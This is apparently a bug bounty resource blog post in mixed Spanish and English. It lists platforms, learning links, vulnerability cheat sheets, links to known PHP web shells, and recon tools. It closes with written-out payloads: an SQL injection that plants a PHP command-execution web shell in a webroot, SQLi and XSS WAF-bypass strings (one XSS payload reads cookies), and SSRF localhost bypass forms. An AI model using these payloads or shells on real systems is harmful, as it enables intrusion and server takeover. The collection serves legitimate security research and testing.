---
layout: post
title:  "Bug Bounty"
author: erik
categories: [ Bug Bounty ]
image: https://user-images.githubusercontent.com/47476901/130895977-418bfb52-8b15-4c58-a2fd-3abc2348c91e.PNG
beforetoc: ""
toc: false
tags: [ Bug Bounty, Resources ]
---
Recursos para aplicar en un bugbounty

# Table of Contents
1. [Bug Bounty Platforms](#plataforms)
2. [Learn Bug Bounty](#learnbounty)
3. [Vulnerabilities](#vulnerabilities)
4. [PHP Shells](#phpshells)
5. [Subdomain and TakeOver Tools](#subtakeover)
6. [BurpSuite Extensions](#burpextensions)
7. [Usefull Things](#usefullthings)

---

### Bug Bounty Platforms: <a name="plataforms"></a>

**Open For Signup**

- [HackerOne](https://www.hackerone.com/)
- [Bugcrowd](https://www.bugcrowd.com/)
- [BountyFactory](https://bountyfactory.io/)
- [Intigriti](https://intigriti.be/)
- [Bugbountyjp](https://bugbounty.jp/)
- [Safehats](https://safehats.com/)
- [BugbountyHQ](https://www.bugbountyhq.com/)
- [Hackerhive](https://hackerhive.io/)
- [Hackenproof](https://hackenproof.com/)


**Invite based Platforms**

- [Synack](https://www.synack.com/red-team/)
- [Cobalt](https://cobalt.io/)
- [Zerocopter](https://zerocopter.com/)
- [Yogosha](https://www.yogosha.com/)
- [Bugbountyzone](https://bugbountyzone.com/)
- [Antihack.me](http://www.antihack.me/)
- [Vulnscope](https://www.vulnscope.com/)

---

### Learn Bug Bounty: <a name="learnbounty"></a>

- [Guide to learn hacking-Youtube](https://www.youtube.com/watch?v=2TofunAI6fU)
- [Portswigger Academy-Web](https://portswigger.net/web-security)
- [Nahamsec's-Twitch](https://www.twitch.tv/nahamsec)
- [Nahamsec interviews with top bug bounty hunters-Youtube](https://www.youtube.com/channel/UCCZDt7MuC3Hzs6IH4xODLBw) 
- [Nahamsec's beginner repo-GitHub](https://github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters)
- [Stök-Youtube](https://www.youtube.com/channel/UCQN2DsjnYH60SFBIA6IkNwg)
- [InsiderPhD-Youtube](https://www.youtube.com/user/RapidBug)
- [Jhaddix-Youtube](https://www.youtube.com/channel/UCk0f0svao7AKeK3RfiWxXE) 
- Blogs from Hacker101 members on how to get started hacking:
  - [zonduu-Blog](https://medium.com/@zonduu/bug-bounty-beginners-guide-683e9d567b9f) 
  - [p4nda-Blog](https://enfinlay.github.io/bugbounty/2020/08/15/so-you-wanna-hack.html) 
- [hacker101 videos](https://www.hacker101.com/videos) 

---

### Vulnerabilities: <a name="vulnerabilities"></a>

**XSS:**
- [https://github.com/erik-451/XSS](https://github.com/erik-451/XSS)
- [https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md)
- [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
- [https://github.com/dwisiswant0/findom-xss](https://github.com/dwisiswant0/findom-xss)

**SQLi:**
- [https://github.com/erik-451/SQLi](https://github.com/erik-451/SQLi)
- [https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/sqli.md
](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/sqli.md)
- [https://github.com/Y000o/sql_injection_basic/blob/master/sql_injection_basic.md](https://github.com/Y000o/sql_injection_basic/blob/master/sql_injection_basic.md)
- [https://geekwire.eu/sql-injection/](https://geekwire.eu/sql-injection/)

**SSRF:**
- [https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/ssrf.md](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/ssrf.md)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)

**CRLF:**
- [https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection)
- [https://owasp.org/www-community/attacks/csrf](https://owasp.org/www-community/attacks/csrf)

**CSV-Injection:**
- [https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/csv-injection.md](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/csv-injection.md)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSV%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSV%20Injection)

**Command Injection**
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

**Directory Traversal:**
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)

**LFI:**
- [https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/lfi.md](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/lfi.md)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [https://github.com/D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite)
- [https://hipotermia.pw/bb/bugpoc-lfi-challenge](https://hipotermia.pw/bb/bugpoc-lfi-challenge)
- [https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt](https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt)

**XXE:**
- [https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xxe.md](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xxe.md)
- [https://corneacristian.medium.com/top-25-xxe-bug-bounty-reports-ab4ca662afad](https://corneacristian.medium.com/top-25-xxe-bug-bounty-reports-ab4ca662afad)
- [https://gosecure.github.io/xxe-workshop/](https://gosecure.github.io/xxe-workshop/)

**Open-Redirect:**
- [https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/open-redirect.md](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/open-redirect.md)

**RCE:**
- [https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/rce.md](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/rce.md)

**Crypto:**
- [https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crypto.md](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crypto.md)

**Template Injection:**
- [https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/template-injection.md](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/template-injection.md)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

**XSLT:**
- [https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xslt.md](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xslt.md)

**Content Injection:**
- [https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/content-injection.md](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/content-injection.md)

**LDAP Injection:**
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection)

**NoSQL Injection:**
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

**CSRF Injection:**
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection)

**GraphQL Injection:**
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection)

**IDOR:**
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References)

**ISCM:**
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Source%20Code%20Management](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Source%20Code%20Management)

**LaTex Injection:**
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection)

**OAuth:**
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/OAuth](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/OAuth)

**XPATH Injection:**
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection)

**Bypass Upload Tricky:**
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
- [https://github.com/bminossi/AllVideoPocsFromHackerOne](https://github.com/bminossi/AllVideoPocsFromHackerOne)

---

### PHP Shells: <a name="phpshells"></a>

* [Simple Shell](https://github.com/backdoorhub/shell-backdoor-list/blob/master/shell/php/simple-shell.php)

* [B374K Shell](https://github.com/ismailtasdelen/shell-backdoor-list/blob/master/shell/php/b374k.php)

* [C99 Shell](https://github.com/ismailtasdelen/shell-backdoor-list/blob/master/shell/php/c99.php)

* [R57 Shell](https://github.com/ismailtasdelen/shell-backdoor-list/blob/master/shell/php/r57.php)

* [Wso Shell](https://github.com/ismailtasdelen/shell-backdoor-list/blob/master/shell/php/wso.php)

* [0byt3m1n1 Shell](https://github.com/ismailtasdelen/shell-backdoor-list/blob/master/shell/php/0byt3m1n1.php)

* [Alfa Shell](https://github.com/ismailtasdelen/shell-backdoor-list/blob/master/shell/php/alfa.php)

* [AK-47 Shell](https://github.com/ismailtasdelen/shell-backdoor-list/blob/master/shell/php/ak47shell.php)

* [Indoxploit Shell](https://github.com/ismailtasdelen/shell-backdoor-list/blob/master/shell/php/indoxploit.php)

* [Marion001 Shell](https://github.com/ismailtasdelen/shell-backdoor-list/blob/master/shell/php/ak47shell.php)

* [Mini Shell](https://github.com/ismailtasdelen/shell-backdoor-list/blob/master/shell/php/mini.php)

* [p0wny-shell](https://github.com/ismailtasdelen/shell-backdoor-list/blob/master/shell/php/p0wny-shell.php)

* [Sadrazam Shell](https://github.com/ismailtasdelen/shell-backdoor-list/blob/master/shell/php/sadrazam.php)

* [Webadmin Shell](https://github.com/ismailtasdelen/shell-backdoor-list/blob/master/shell/php/webadmin.php)

* [Wordpress Shell](https://github.com/ismailtasdelen/shell-backdoor-list/blob/master/shell/php/wordpress.php)

* [LazyShell](https://github.com/joeylane/Lazyshell.php/blob/master/lazyshell.php)

* [https://github.com/bastillion-io/Bastillion](https://github.com/bastillion-io/Bastillion)

---



### Subdomain  and  TakeOver  Tools: <a name="subtakeover"></a>

**SubDomain TakeOver:**

- SubDomain TakeOver Scanner by 0x94: [https://github.com/antichown/subdomain-takeover](https://github.com/antichown/subdomain-takeover)

- Subdomain Takeover Scanner: [https://github.com/SaadAhmedx/Subdomain-Takeover](https://github.com/SaadAhmedx/Subdomain-Takeover)

- Subzy: 
    - [https://github.com/LukaSikic/subzy](https://github.com/LukaSikic/subzy)
    - Subdomain takeover vulnerability checker

- TakeOverV1: 
    - [https://github.com/samhaxr/TakeOver-v1](https://github.com/samhaxr/TakeOver-v1)
    - El script de adquisición extrae el registro CNAME de todos los subdominios a la vez. TakeOver ahorra tiempo a los investigadores y aumenta las posibilidades de encontrar una vulnerabilidad de takeover de subdominios.


**Tools for Subdomains:**

- SubR3con: 
    - [https://github.com/rohitcoder/SubR3con](https://github.com/rohitcoder/SubR3con)
    - Objetivo específico y luego verifica el código de status para una posible vulnerabilidad de toma de control del subdominio
	
- DNS Wordlist: [https://github.com/ZephrFish/Wordlists/blob/master/HugeDNS.7z](https://github.com/ZephrFish/Wordlists/blob/master/HugeDNS.7z)

- [https://github.com/1N3/BruteX](https://github.com/1N3/BruteX)
- [https://github.com/1N3/BlackWidow](https://github.com/1N3/BlackWidow)
- [https://github.com/sa7mon/S3Scanner](https://github.com/sa7mon/S3Scanner)
- [https://github.com/MichaelStott/CRLF-Injection-Scanner](https://github.com/MichaelStott/CRLF-Injection-Scanner)
- [https://github.com/jaeles-project/jaeles](https://github.com/jaeles-project/jaeles)
- [https://github.com/random-robbie/kube-scan](https://github.com/random-robbie/kube-scan)
- [https://github.com/hash3liZer/Subrake](https://github.com/hash3liZer/Subrake)
- [https://github.com/j3ssie/Osmedeus](https://github.com/j3ssie/Osmedeus)
- [https://github.com/sullo/nikto](https://github.com/sullo/nikto)

---

### BurpSuite Extensions: <a name="burpextensions"></a>

- [Sitemap Extractor](https://github.com/PortSwigger/site-map-extractor)
- [Param-Miner](https://github.com/PortSwigger/param-miner)
- [Autorize](https://github.com/PortSwigger/autorize)
- [BurpJSLinkFinder](https://github.com/InitRoot/BurpJSLinkFinder)
- [BurpBounty](https://github.com/wagiro/BurpBounty)
- [domain_hunter](https://github.com/bit4woo/domain_hunter)

---

### Usefull Things: <a name="usefullthings"></a>

**6 Methods to bypass CSRF protection on a web application:**
- [https://shahmeeramir.com/methods-to-bypass-csrf-protection-on-a-web-application-3198093f6599](https://shahmeeramir.com/methods-to-bypass-csrf-protection-on-a-web-application-3198093f6599)

**Exploit - Microsoft Exchange Server DlpUtils AddTenantDlpPolicy RCE:**
- [https://cxsecurity.com/issue/WLB-2020090079](https://cxsecurity.com/issue/WLB-2020090079)

**Java deserelizacion:**
- [https://github.com/ikkisoft/SerialKiller](https://github.com/ikkisoft/SerialKiller)
- [https://pivotal.io/security/cve-2020-5398](https://pivotal.io/security/cve-2020-5398)
- [https://github.com/motikan2010/CVE-2020-5398/](https://github.com/motikan2010/CVE-2020-5398/)

**Herramientas y trucos para el bug bounty:**
- [https://dhiyaneshgeek.github.io/bug/bounty/2020/02/06/recon-with-me/](https://dhiyaneshgeek.github.io/bug/bounty/2020/02/06/recon-with-me/)

**Mapa de vulnerabilidades:**
- [https://www.xmind.net/m/2QyGbx/](https://www.xmind.net/m/2QyGbx/)

**Mapa del bug bounty:**
- [https://www.xmind.net/m/VWTC3u/](https://www.xmind.net/m/VWTC3u/)

**21 Cosas que puedes hacer con una XSS:**
- [https://s0md3v.github.io/21-things-xss/](https://s0md3v.github.io/21-things-xss/)

**Tips para Bug Bounty:**
- [https://github.com/devanshbatham/Awesome-Bugbounty-Writeups](https://github.com/devanshbatham/Awesome-Bugbounty-Writeups)

**Info para principiantes:**
- [https://github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters](https://github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters)

### Ayudas: 

- Cheat Sheet Python: [https://blog.underc0de.org/cheat-sheet-python/](https://blog.underc0de.org/cheat-sheet-python/)

- La biblia de bash: [https://github.com/dylanaraps/pure-bash-bible](https://github.com/dylanaraps/pure-bash-bible)
- Machine Learning para la cyberseguridad: [https://github.com/jivoi/awesome-ml-for-cybersecurity](https://github.com/jivoi/awesome-ml-for-cybersecurity)
- Pagina con muchas tools utiles: [https://technisette.com/p/home](https://technisette.com/p/home)
	- [Databases](https://technisette.com/p/databases)
	- [A lot of Tools](https://technisette.com/p/tools)
- Consultas de búsqueda de Shodan: [https://github.com/jakejarvis/awesome-shodan-queries](https://github.com/jakejarvis/awesome-shodan-queries)

### Payloads:

**SQLi**

- SQL Web Shell:

```sql
' union select '<?php $sys = "sys"."tem"; $sys($_GET["c"]); ?>' into outfile 'C:\inetpub\wwwroot\robots.php' -- -`
```

- SQLi Payload:

```SQL
"' OR 1=1 --"@x.com
```

- SQLi WAF ByPass:

```sql
1,group_concat(column_name) /*%%!asd%%%%*/from/*%%!asd%%%%*/information_schema.columns where table_name=’users’ --+
```

**XSS**

- XSS One to bypass Incapsula WAF:

```js
<input id='a'value='global'><input id='b'value='E'>
<input 'id='c'value='val'><input id='d'value='aler'>
<input id='e'value='t(documen'><input id='f'value='t.domain)'>
<svg+onload[\r\n]=$[a.value+b.value+c.value](d.value+e.value+f.value)>
<b onmouseover=alert('Wufff!')>click me!</b>
"><script>propmt("mamunwhh")</script>
"><script>alert(document.cookie)</script>
/><svg src=x onload=confirm("1337");>
```

-  XSS WAF ByPass:

```js
<audio src=1 onerror=alert(/xss/);>
<audio src=1 onerror=prompt('xss');>
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4="></object>
```

**SSRF**

-  SSRF Bypass list for localhost (127.0.0.1):

```
http://127.1/
http://0000::1:80/
http://[::]:80/
http://2130706433/
http://whitelisted@127.0.0.1
http://0x7f000001/
http://017700000001
http://0177.00.00.01
```
